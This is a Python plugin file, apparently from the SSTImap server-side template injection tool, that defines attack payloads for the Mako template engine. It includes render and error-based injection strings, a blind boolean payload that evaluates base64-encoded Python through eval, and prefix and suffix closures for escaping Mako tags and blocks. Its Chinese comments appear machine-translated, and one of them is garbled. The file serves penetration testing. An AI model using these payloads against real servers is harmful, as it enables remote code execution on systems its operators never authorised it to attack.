from plugins.languages import python
from utils import rand


class Mako(python.Python):
    priority = 5
    generic_plugin = True
    plugin_info = {
        "Description": 'Mako 模板引擎',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://www.makotemplates.org/",
            "Github: https://github.com/sqlalchemy/mako",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{{header[0]}+{header[1]}}}',
                'trailer': '${{{trailer[0]}+{trailer[1]}}}',
                'test_render': f"""${{'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')}}${{"%" | u}}""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}%25'
            },
            'render_error': {
                'render': '{code}',
                'header': '<%doc>${{1/0}}</%doc>${{'' | u}}${{getattr("", str({header[0]}+{header[1]})+str(',
                'trailer': ').rstrip()+str({trailer[0]}+{trailer[1]}))}}',
                'test_render': f"""'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'evaluate': {
                # 一种检查实际 Mako 语法的方法，注释掉除零
                'evaluate': """${{'' | u}}${{{code}}}<%doc>${{1/0}}</%doc>"""
            },
            'evaluate_error': {
                'evaluate': """{code}"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """${{'' | u}}<%doc>${{1/0}}</%doc>${{str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # 普通反射标签${}
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '', 'closures': python.ctx_closures},
            # 代码块
            # 这涵盖 <% %s %>、<%! %s %>, <% %s=1 %>
            {'level': 1, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': python.ctx_closures},
            # If 和 for 块
            # % if %s:\n% endif
            # % f 或 %s 中的 a:\n% endfor
            {'level': 5, 'prefix': '{closure}#\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # 灰泥鳅块
            {'level': 5, 'prefix': '</%doc>', 'suffix': '<%doc>'},
            {'level': 5, 'prefix': '</%def>', 'suffix': '<%def name="t(x)">'},
            {'level': 5, 'prefix': '</%block>', 'suffix': '<%block>'},
            {'level': 5, 'prefix': '</%text>', 'suffix': '<%text>'},
        ])
